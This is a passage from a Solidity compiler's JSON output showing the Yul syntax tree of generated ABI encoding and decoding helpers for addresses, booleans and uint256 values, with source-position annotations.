																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "820:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "820:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "820:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "793:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "802:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "789:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "789:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "814:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "785:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "785:32:5"
															},
															"nodeType": "YulIf",
															"src": "782:52:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "843:29:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "862:9:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "856:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "856:16:5"
															},
															"variables": [
																{
																	"name": "value",
																	"nodeType": "YulTypedName",
																	"src": "847:5:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "925:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "934:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "937:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "927:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "927:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "927:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "894:5:5"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"name": "value",
																								"nodeType": "YulIdentifier",
																								"src": "915:5:5"
																							}
																						],
																						"functionName": {
																							"name": "iszero",
																							"nodeType": "YulIdentifier",
																							"src": "908:6:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "908:13:5"
																					}
																				],
																				"functionName": {
																					"name": "iszero",
																					"nodeType": "YulIdentifier",
																					"src": "901:6:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "901:21:5"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "891:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "891:32:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "884:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "884:40:5"
															},
															"nodeType": "YulIf",
															"src": "881:60:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "950:15:5",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "960:5:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "950:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "738:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "749:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "761:6:5",
														"type": ""
													}
												],
												"src": "694:277:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1105:145:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1115:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1127:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1138:2:5",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1123:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1123:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1115:4:5"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1157:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "1172:6:5"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "1188:3:5",
																								"type": "",
																								"value": "160"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "1193:1:5",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "shl",
																							"nodeType": "YulIdentifier",
																							"src": "1184:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "1184:11:5"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "1197:1:5",
																						"type": "",
																						"value": "1"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "1180:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1180:19:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "1168:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1168:32:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1150:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1150:51:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1150:51:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1221:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1232:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1217:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1217:18:5"
																	},
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "1237:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1210:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1210:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1210:34:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1066:9:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1077:6:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1085:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1096:4:5",
														"type": ""
													}
												],
												"src": "976:274:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1356:102:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1366:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1378:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1389:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1374:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1374:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1366:4:5"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1408:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "1423:6:5"
																			},
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "1439:3:5",
																								"type": "",
																								"value": "160"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "1444:1:5",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "shl",
																							"nodeType": "YulIdentifier",
																							"src": "1435:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "1435:11:5"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "1448:1:5",
																						"type": "",
																						"value": "1"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "1431:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1431:19:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "1419:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1419:32:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1401:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1401:51:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1401:51:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1325:9:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1336:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1347:4:5",
														"type": ""
													}
												],
												"src": "1255:203:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1544:103:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1590:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1599:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1602:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1592:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1592:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1592:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1565:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1574:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1561:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1561:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1586:2:5",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "1557:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1557:32:5"
															},
															"nodeType": "YulIf",
															"src": "1554:52:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1615:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1631:9:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1625:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1625:16:5"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "1615:6:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_uint256_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1510:9:5",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "1521:7:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1533:6:5",
														"type": ""
													}
												],
												"src": "1463:184:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1809:218:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1819:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1831:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1842:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1827:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1827:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1819:4:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1854:29:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1872:3:5",
																				"type": "",
																				"value": "160"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1877:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "1868:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1868:11:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1881:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1864:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1864:19:5"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "1858:2:5",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1899:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "1914:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "1922:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "1910:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1910:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1892:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1892:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1892:34:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1946:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1957:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1942:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1942:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value1",
																				"nodeType": "YulIdentifier",
																				"src": "1966:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "1974:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "1962:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1962:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1935:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1935:43:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1935:43:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1998:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2009:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1994:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1994:18:5"
																	},
																	{
																		"name": "value2",
																		"nodeType": "YulIdentifier",
																		"src": "2014:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1987:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1987:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1987:34:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1762:9:5",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "1773:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "1781:6:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1789:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1800:4:5",
														"type": ""
													}
												],
												"src": "1652:375:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2198:218:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2208:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2220:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2231:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2216:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2216:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2208:4:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "2243:29:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2261:3:5",
																				"type": "",
																				"value": "160"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2266:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "2257:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2257:11:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2270:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2253:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2253:19:5"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "2247:2:5",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2288:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "2303:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "2311:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "2299:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2299:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2281:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2281:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2281:34:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2335:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2346:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2331:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2331:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value1",
																				"nodeType": "YulIdentifier",
																				"src": "2355:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "2363:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "2351:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2351:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2324:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2324:43:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2324:43:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2387:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2398:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2383:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2383:18:5"
																	},
																	{
																		"name": "value2",
																		"nodeType": "YulIdentifier",
																		"src": "2403:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2376:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2376:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2376:34:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_rational_45_by_1__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2151:9:5",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "2162:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "2170:6:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2178:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2189:4:5",
														"type": ""
													}
												],
												"src": "2032:384:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2587:218:5",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2597:26:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2609:9:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2620:2:5",
																		"type": "",
																		"value": "96"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2605:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2605:18:5"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2597:4:5"
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "2632:29:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2650:3:5",
																				"type": "",
																				"value": "160"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2655:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "2646:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2646:11:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2659:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2642:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2642:19:5"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "2636:2:5",
																	"type": ""
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2677:9:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value0",
																				"nodeType": "YulIdentifier",
																				"src": "2692:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "2700:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "2688:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2688:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2670:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2670:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2670:34:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2724:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2735:2:5",
																				"type": "",
																				"value": "32"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2720:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2720:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value1",
																				"nodeType": "YulIdentifier",
																				"src": "2744:6:5"
																			},
																			{
																				"name": "_1",
																				"nodeType": "YulIdentifier",
																				"src": "2752:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "2740:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2740:15:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2713:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2713:43:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2713:43:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2776:9:5"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2787:2:5",
																				"type": "",
																				"value": "64"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2772:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2772:18:5"
																	},
																	{
																		"name": "value2",
																		"nodeType": "YulIdentifier",
																		"src": "2792:6:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2765:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "2765:34:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2765:34:5"
														}
													]
												},
												"name": "abi_encode_tuple_t_address_t_address_t_rational_90_by_1__to_t_address_t_address_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2540:9:5",
														"type": ""
													},
													{
														"name": "value2",
														"nodeType": "YulTypedName",
														"src": "2551:6:5",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "2559:6:5",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2567:6:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2578:4:5",
														"type": ""
													}
												],
												"src": "2421:384:5"
											}
										]
									},
